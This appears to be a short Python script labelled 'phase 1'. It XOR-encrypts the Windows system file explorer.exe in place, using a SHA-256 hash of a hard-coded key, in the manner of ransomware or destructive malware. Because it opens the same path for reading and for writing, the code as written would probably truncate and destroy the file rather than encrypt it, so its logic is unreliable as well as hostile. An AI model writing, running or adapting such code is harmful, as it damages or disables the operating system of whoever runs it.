#phase 1
from hashlib import sha256
entree = "C:\Windows\system32\explorer.exe"
sortie = "C:\Windows\system32\explorer.exe"
key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
keys = sha256(key.encode('utf-8')).digest()
with open(entree,'rb') as f_entree:
 with open(sortie,'wb') as f_sortie:
  i = 0
  while f_entree.peek():
    c = ord(f_entree.read(1))
    j = i % len(keys)
    b = bytes([c^keys[j]])
    f_sortie.write(b)
    i = i + 1 

